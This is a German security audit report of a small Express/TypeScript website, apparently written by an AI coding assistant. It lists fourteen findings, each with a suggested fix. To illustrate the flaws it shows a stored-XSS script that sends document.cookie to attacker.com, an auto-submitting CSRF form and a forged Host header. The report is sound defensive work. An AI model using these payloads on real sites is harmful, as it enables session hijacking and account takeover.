# Sicherheitsaudit - Kaiser-Service Website

> **Datum**: 2026-01-06
> **Version**: 1.0
> **Status**: Pre-Production Review

## Executive Summary

Dieses Dokument enthält eine umfassende Sicherheitsanalyse der Kaiser-Service Website. Die Anwendung implementiert bereits mehrere wichtige Sicherheitsmaßnahmen, weist jedoch **kritische Sicherheitslücken** auf, die vor einem Production-Deployment **zwingend** behoben werden müssen.

**Risiko-Übersicht:**
- 🔴 **Kritisch**: 2 Issues
- 🟠 **Hoch**: 4 Issues
- 🟡 **Mittel**: 5 Issues
- 🟢 **Niedrig**: 3 Issues

---

## 🔴 Kritische Sicherheitslücken

### 1. Unsicherer Standard-SESSION_SECRET

**Datei**: `server/routes.ts:46`
**Schweregrad**: 🔴 KRITISCH
**CVSS Score**: 9.8 (Critical)

#### Problem

```typescript
session({
  secret: process.env.SESSION_SECRET || "kaiser-service-secret-key-change-in-production",
  // ...
})
```

Der Fallback-Wert für `SESSION_SECRET` ist ein hartcodierter String. Dieser Wert ist:
- Im öffentlichen Quellcode sichtbar
- Für jeden Angreifer bekannt
- Ermöglicht Session-Hijacking und Session-Forgery

#### Auswirkungen

Ein Angreifer kann:
1. Sessions fälschen und sich als beliebiger Benutzer ausgeben
2. Session-Cookies manipulieren
3. Admin-Zugriff erlangen
4. Benutzerdaten stehlen

#### Lösung

```typescript
// server/routes.ts
session({
  secret: process.env.SESSION_SECRET!,
  // ...
})

// Server-Start mit Validierung (server/index.ts)
if (!process.env.SESSION_SECRET) {
  console.error('FATAL: SESSION_SECRET environment variable is required!');
  process.exit(1);
}
```

**Generierung eines sicheren Secrets:**

```bash
# Linux/macOS
openssl rand -base64 32

# Node.js
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

**Status**: ❌ Nicht behoben

---

### 2. Fehlender CSRF-Schutz

**Dateien**: Alle state-changing Endpoints
**Schweregrad**: 🔴 KRITISCH
**CVSS Score**: 8.1 (High)

#### Problem

Es gibt **keinen CSRF-Token-Mechanismus** für state-changing Operationen:
- POST /api/auth/register
- POST /api/auth/login
- POST /api/forum/threads
- PATCH /api/forum/threads/:id
- DELETE /api/forum/threads/:id
- etc.

#### Auswirkungen

Ein Angreifer kann:
1. Cross-Site Request Forgery-Angriffe durchführen
2. Ungewollte Aktionen im Namen authentifizierter Benutzer ausführen
3. Forum-Posts im Namen von Opfern erstellen/löschen
4. Benutzerprofile manipulieren

#### Angriffsszenario

```html
<!-- Angreifer-Website -->
<form action="https://kaiser-service.de/api/forum/threads" method="POST">
  <input type="hidden" name="title" value="Spam Thread">
  <input type="hidden" name="content" value="Click here for prizes!">
</form>
<script>document.forms[0].submit();</script>
```

Wenn ein authentifizierter Benutzer diese Seite besucht, wird automatisch ein Thread erstellt.

#### Lösung

**Option 1: csurf Package (Express)**

```bash
npm install csurf
```

```typescript
// server/routes.ts
import csrf from 'csurf';

const csrfProtection = csrf({ cookie: true });

app.use(csrfProtection);

// CSRF-Token an Frontend senden
app.get('/api/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Alle state-changing Endpoints sind nun geschützt
```

**Option 2: SameSite Cookies (Teilschutz)**

```typescript
session({
  cookie: {
    sameSite: 'strict', // oder 'lax'
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
  }
})
```

**Status**: ❌ Nicht behoben

---

## 🟠 Hohe Sicherheitsrisiken

### 3. Fehlender Rate Limiting

**Dateien**: `server/routes.ts` (alle Endpoints)
**Schweregrad**: 🟠 HOCH
**CVSS Score**: 7.5 (High)

#### Problem

Kein Rate Limiting für:
- Login-Endpoint (`/api/auth/login`) → Brute-Force-Angriffe
- Registrierung (`/api/auth/register`) → Account-Spam
- Email-Verifizierung (`/api/auth/resend-verification`) → Email-Bombing
- Kontaktformular (`/api/contact`) → Spam

#### Auswirkungen

- **Brute-Force-Angriffe**: Unbegrenzte Login-Versuche
- **DoS**: Server-Überlastung durch massenhafte Requests
- **Spam**: Massenhafte Account-Erstellung
- **Email-Bombing**: Spam-Verifizierungs-Emails

#### Lösung

```bash
npm install express-rate-limit
```

```typescript
import rateLimit from 'express-rate-limit';

// Allgemeiner Limiter
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 Minuten
  max: 100, // Max 100 Requests pro IP
  message: 'Zu viele Anfragen, bitte versuchen Sie es später erneut.'
});

// Strenger Limiter für Authentication
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // Max 5 Login-Versuche pro 15 Minuten
  skipSuccessfulRequests: true,
});

app.use('/api/', generalLimiter);
app.use('/api/auth/login', authLimiter);
app.use('/api/auth/register', authLimiter);
```

**Status**: ❌ Nicht implementiert

---

### 4. XSS-Anfälligkeit in Forum-Posts

**Dateien**: `server/routes.ts:465-491`, `client/src/pages/ThreadDetail.tsx`
**Schweregrad**: 🟠 HOCH
**CVSS Score**: 7.2 (High)

#### Problem

Forum-Posts werden **nicht sanitized**:

```typescript
// server/routes.ts:478
const validatedData = insertPostSchema.parse({
  ...req.body,
  authorId: user.id,
});

const post = await storage.createPost(validatedData);
// Kein HTML-Escaping oder Sanitization!
```

Ein Angreifer kann schädlichen JavaScript-Code in Posts einfügen:

```html
<script>
  // Cookies stehlen
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<img src="x" onerror="alert('XSS')">
```

#### Auswirkungen

- **Stored XSS**: Persistenter JavaScript-Code in der Datenbank
- **Session-Hijacking**: Cookies können gestohlen werden
- **Phishing**: Fake-Login-Formulare können injiziert werden
- **Malware-Verbreitung**: Links zu Malware

#### Lösung

**Backend: Sanitization**

```bash
npm install dompurify jsdom
```

```typescript
import { JSDOM } from 'jsdom';
import DOMPurify from 'dompurify';

const window = new JSDOM('').window;
const purify = DOMPurify(window);

// In routes.ts:478
const sanitizedContent = purify.sanitize(req.body.content, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'u', 'br', 'a', 'ul', 'ol', 'li', 'code', 'pre'],
  ALLOWED_ATTR: ['href']
});

const validatedData = insertPostSchema.parse({
  ...req.body,
  content: sanitizedContent,
  authorId: user.id,
});
```

**Frontend: Sichere Anzeige**

```typescript
// Verwenden Sie dangerouslySetInnerHTML NICHT ohne Sanitization
// Besser: Markdown mit Sanitization oder Plain Text
```

**Status**: ❌ Nicht implementiert

---

### 5. Host Header Injection in Email-Verifizierung

**Datei**: `server/routes.ts:102, 189`
**Schweregrad**: 🟠 HOCH
**CVSS Score**: 6.5 (Medium-High)

#### Problem

```typescript
const verificationUrl = `${req.protocol}://${req.get("host")}/verify-email?token=${token}`;
```

Der `Host`-Header kann von einem Angreifer manipuliert werden:

```http
POST /api/auth/register HTTP/1.1
Host: attacker.com
```

Resultierende Email:
```
Verifizierungs-Link: https://attacker.com/verify-email?token=abc123
```

#### Auswirkungen

- **Phishing**: Benutzer werden auf Angreifer-Website umgeleitet
- **Token-Theft**: Verifizierungs-Token werden an Angreifer gesendet
- **Account-Takeover**: Angreifer können Accounts übernehmen

#### Lösung

```typescript
// .env
SITE_URL="https://kaiser-service.de"

// server/routes.ts
const SITE_URL = process.env.SITE_URL || 'http://localhost:5000';

const verificationUrl = `${SITE_URL}/verify-email?token=${token}`;
```

**Status**: ❌ Nicht behoben

---

### 6. Ungeschützter Admin-Endpoint

**Datei**: `server/routes.ts:294-364`
**Schweregrad**: 🟠 HOCH
**CVSS Score**: 6.0 (Medium)

#### Problem

```typescript
app.post("/api/forum/categories/init", async (req, res, next) => {
  // Kein Authentication-Check!
  const existingCategories = await storage.getCategories();
  // ...
});
```

Jeder kann diesen Endpoint aufrufen und Kategorien erstellen.

#### Lösung

```typescript
// Admin-Middleware
function isAdmin(req: any, res: any, next: any) {
  if (!req.isAuthenticated()) {
    return res.status(401).json({ message: "Nicht angemeldet" });
  }
  // Admin-Check (z.B. admin-Flag in User-Schema)
  if (!req.user.isAdmin) {
    return res.status(403).json({ message: "Admin-Rechte erforderlich" });
  }
  return next();
}

app.post("/api/forum/categories/init", isAdmin, async (req, res, next) => {
  // ...
});
```

**Status**: ❌ Nicht behoben

---

## 🟡 Mittlere Sicherheitsrisiken

### 7. Fehlende Content-Security-Policy (CSP)

**Datei**: `server/index.ts`
**Schweregrad**: 🟡 MITTEL

#### Problem

Keine CSP-Header → XSS-Angriffe sind einfacher durchführbar.

#### Lösung

```bash
npm install helmet
```

```typescript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // Nur wenn nötig
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "wss:", "https://api.elevenlabs.io"],
    }
  }
}));
```

**Status**: ❌ Nicht implementiert

---

### 8. IP-Logging ohne Anonymisierung

**Datei**: `server/routes.ts:742`
**Schweregrad**: 🟡 MITTEL (DSGVO-Risiko)

#### Problem

```typescript
console.log("Contact form submission:", {
  ...validatedData,
  timestamp: new Date().toISOString(),
  ip: req.ip, // ← Vollständige IP wird geloggt
});
```

DSGVO-Problematik: IP-Adressen sind personenbezogene Daten.

#### Lösung

```typescript
function anonymizeIP(ip: string): string {
  if (ip.includes(':')) {
    // IPv6: Letzte 80 Bits entfernen
    return ip.split(':').slice(0, 4).join(':') + '::';
  }
  // IPv4: Letztes Oktett entfernen
  return ip.split('.').slice(0, 3).join('.') + '.0';
}

console.log("Contact form submission:", {
  ...validatedData,
  timestamp: new Date().toISOString(),
  ip: anonymizeIP(req.ip || ''),
});
```

**Status**: ❌ Nicht implementiert

---

### 9. Admin-Passwort wird bei jedem Start aktualisiert

**Datei**: `server/routes.ts:798-800`
**Schweregrad**: 🟡 MITTEL

#### Problem

```typescript
if (existingAdmin) {
  // Update existing admin password
  const hashedPassword = await bcrypt.hash(adminPassword, 10);
  await storage.updateUser(existingAdmin.id, { password: hashedPassword });
  console.log(`Admin user '${adminUsername}' password updated.`);
}
```

Bei jedem Server-Neustart wird das Admin-Passwort überschrieben, wenn `ADMIN_PASSWORD` gesetzt ist.

#### Risiken

- Unerwartetes Verhalten in Production
- Passwort-Änderungen werden überschrieben
- Logging könnte sensitiv sein

#### Lösung

```typescript
// Nur beim ersten Mal erstellen, nicht updaten
if (existingAdmin) {
  console.log(`Admin user '${adminUsername}' already exists. Skipping password update.`);
  return;
}
```

**Status**: ⚠️ Verhaltensänderung empfohlen

---

### 10. Fehlende Password-Strength-Validation

**Datei**: `shared/schema.ts:108-112`
**Schweregrad**: 🟡 MITTEL

#### Problem

Keine Passwort-Stärke-Anforderungen für normale Benutzer:

```typescript
export const insertUserSchema = createInsertSchema(users).omit({
  id: true,
  createdAt: true,
  emailVerified: true,
});
// Kein .refine() für Passwort-Stärke
```

#### Lösung

```typescript
export const insertUserSchema = createInsertSchema(users)
  .omit({
    id: true,
    createdAt: true,
    emailVerified: true,
  })
  .refine(
    (data) => data.password.length >= 8,
    { message: "Passwort muss mindestens 8 Zeichen lang sein" }
  )
  .refine(
    (data) => /[A-Z]/.test(data.password),
    { message: "Passwort muss mindestens einen Großbuchstaben enthalten" }
  )
  .refine(
    (data) => /[a-z]/.test(data.password),
    { message: "Passwort muss mindestens einen Kleinbuchstaben enthalten" }
  )
  .refine(
    (data) => /[0-9]/.test(data.password),
    { message: "Passwort muss mindestens eine Ziffer enthalten" }
  );
```

**Status**: ⚠️ Empfohlen (User Experience vs. Security Tradeoff)

---

### 11. Fehlende .gitignore

**Datei**: `.gitignore` (nicht vorhanden)
**Schweregrad**: 🟡 MITTEL

#### Problem

Ohne `.gitignore` könnten sensitive Dateien versehentlich committet werden:
- `.env` (Secrets!)
- `node_modules/`
- `dist/`
- `.DS_Store`

#### Lösung

Siehe separate `.gitignore`-Datei (wird erstellt).

**Status**: ⚠️ Wird behoben

---

## 🟢 Niedrige Sicherheitsrisiken

### 12. Fehlende Helmet.js Security Headers

**Schweregrad**: 🟢 NIEDRIG

Standardmäßige Express-Header sind nicht optimal. Helmet.js sollte hinzugefügt werden.

---

### 13. Kein HTTPS-Redirect

**Schweregrad**: 🟢 NIEDRIG

In Production sollte HTTP automatisch zu HTTPS redirecten (meist auf Reverse-Proxy-Ebene).

---

### 14. Fehlende Security.txt

**Schweregrad**: 🟢 NIEDRIG

Eine `/.well-known/security.txt` Datei fehlt für Responsible Disclosure.

```
Contact: mailto:Service-Kaiser@proton.me
Expires: 2027-01-01T00:00:00.000Z
Preferred-Languages: de, en
```

---

## ✅ Implementierte Sicherheitsmaßnahmen

### Positive Aspekte

1. ✅ **Passwort-Hashing**: bcryptjs mit 10 Runden
2. ✅ **HTTP-only Cookies**: Session-Cookies sind HTTP-only
3. ✅ **Secure Cookies in Production**: `secure: process.env.NODE_ENV === "production"`
4. ✅ **SQL-Injection-Schutz**: Drizzle ORM mit Prepared Statements
5. ✅ **Input-Validierung**: Zod-Schema-Validierung
6. ✅ **Email-Verifizierung**: Benutzer müssen Email bestätigen
7. ✅ **Authorization-Checks**: Owner-basierte Zugriffskontrolle
8. ✅ **Password-less Responses**: Passwörter werden nie an Client gesendet
9. ✅ **Token-Expiration**: Verifizierungs-Token laufen nach 24h ab
10. ✅ **DSGVO-Compliance**: Cookie-Consent und Datenschutzerklärung

---

## 🚀 Prioritäten für Production-Deployment

### Sofort (vor Go-Live):

1. 🔴 SESSION_SECRET setzen und Standard-Wert entfernen
2. 🔴 CSRF-Protection implementieren
3. 🟠 Rate Limiting aktivieren
4. 🟠 XSS-Sanitization für Forum-Posts
5. 🟠 Host Header Injection beheben
6. 🟠 Admin-Endpoint absichern

### Kurzfristig (erste Woche):

7. 🟡 Content-Security-Policy (Helmet.js)
8. 🟡 IP-Anonymisierung
9. 🟡 .gitignore erstellen
10. 🟡 Password-Strength-Validierung

### Mittelfristig (erste 4 Wochen):

11. 🟢 Security Headers (Helmet.js komplett)
12. 🟢 HTTPS-Redirect
13. 🟢 Security.txt
14. 🟢 Dependency-Audit (`npm audit`)
15. 🟢 Penetration Testing

---

## 📋 Checkliste für Entwickler

```
Pre-Production Security Checklist:

[ ] SESSION_SECRET in .env gesetzt (nicht default!)
[ ] .env zu .gitignore hinzugefügt
[ ] CSRF-Protection implementiert (csurf)
[ ] Rate Limiting aktiviert (express-rate-limit)
[ ] XSS-Sanitization für User Content (DOMPurify)
[ ] Host Header Injection behoben (feste SITE_URL)
[ ] Admin-Endpoints mit Authentication geschützt
[ ] Helmet.js für Security Headers installiert
[ ] CSP-Policy konfiguriert
[ ] IP-Logging anonymisiert
[ ] npm audit durchgeführt und kritische Lücken behoben
[ ] HTTPS konfiguriert (Let's Encrypt)
[ ] Security.txt erstellt
[ ] Backup-Strategie implementiert
[ ] Monitoring & Logging aktiviert (z.B. Sentry)
[ ] Incident Response Plan erstellt
```

---

## 📞 Kontakt für Sicherheitsfragen

- **Email**: Service-Kaiser@proton.me
- **Responsible Disclosure**: Sicherheitslücken bitte vertraulich melden

---

**Audit durchgeführt von**: Claude Code (Anthropic)
**Nächstes Audit empfohlen**: Nach Implementation der kritischen Fixes

